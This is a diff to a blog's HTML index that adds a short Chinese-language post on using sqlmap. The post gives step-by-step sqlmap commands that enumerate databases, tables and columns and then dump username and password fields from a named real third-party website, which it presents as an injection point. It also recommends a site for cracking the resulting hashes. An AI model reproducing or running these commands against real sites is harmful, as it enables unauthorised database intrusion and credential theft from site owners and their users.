@@ -160,6 +160,86 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-“关于sqlmap的使用”" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/04/21/“关于sqlmap的使用”/">“关于sqlmap的使用”</a>
+    </h1>
+  
+
+        
+        <a href="/2018/04/21/“关于sqlmap的使用”/" class="archive-article-date">
+  	<time datetime="2018-04-21T04:50:29.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-04-21</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <pre><code>萌新上路，不好勿喷
+</code></pre><p>sqlmap的下载和安装： </p>
+<p>将python 2.7安装在c盘，把sqlmap的安装包放在python2.7的文件夹中 </p>
+<p>打开运行输入cmd </p>
+<p>这里我提供供了一个注入点：<a href="http://www.dcsp.com.tw/news_detail.php?id=56" target="_blank" rel="noopener">http://www.dcsp.com.tw/news_detail.php?id=56</a> </p>
+<p>然后 ，我们运行指令： sqlmap.py -u <a href="http://www.dcsp.com.tw/news_detail.php?id=56" target="_blank" rel="noopener">http://www.dcsp.com.tw/news_detail.php?id=56</a> –dbs </p>
+<p>dbs是猜数据库 运行后需要用户输[Y/N],如果懒得打 直接在url后打 –batch 系统会自行选择</p>
+<p>当我们暴出了数据库以后，针对这个数据库进行猜表</p>
+<p>输入命令 ：sqlmap.py -u <a href="http://www.dcsp.com.tw/news_detail.php?id=56" target="_blank" rel="noopener">http://www.dcsp.com.tw/news_detail.php?id=56</a> -D (数据库） –tables</p>
+<p>当我们得到了用户表以后 输入命令 ：</p>
+<p>sqlmap.py -u <a href="http://www.dcsp.com.tw/news_detail.php?id=56" target="_blank" rel="noopener">http://www.dcsp.com.tw/news_detail.php?id=56</a> -D （数据库） -T (用户表） –<br>columns </p>
+<p>接着我们对可能存在着用户名和密码的字段进行猜解 -C:指定要暴的字段 –dump:将结果导出</p>
+<p>命令如下:</p>
+<p>sqlmap.py -u <a href="http://www.dcsp.com.tw/news_detail.php?id=56" target="_blank" rel="noopener">http://www.dcsp.com.tw/news_detail.php?id=56</a> -D （数据库） -T (用户表) -C “username,</p>
+<p>password” –dump</p>
+<p>此时会得到一个md5 或者是windows的加密过的密文我提供了一个免费解密的网站</p>
+<p><a href="http://www.ddosi.com" target="_blank" rel="noopener">http://www.ddosi.com</a> 网站里也有大量的学习资料 在后续我还会继续写其他的注入方式</p>
+<p>主要是关于sqlmap的</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2018/04/21/“关于sqlmap的使用”/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-“关于vim的使用”" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
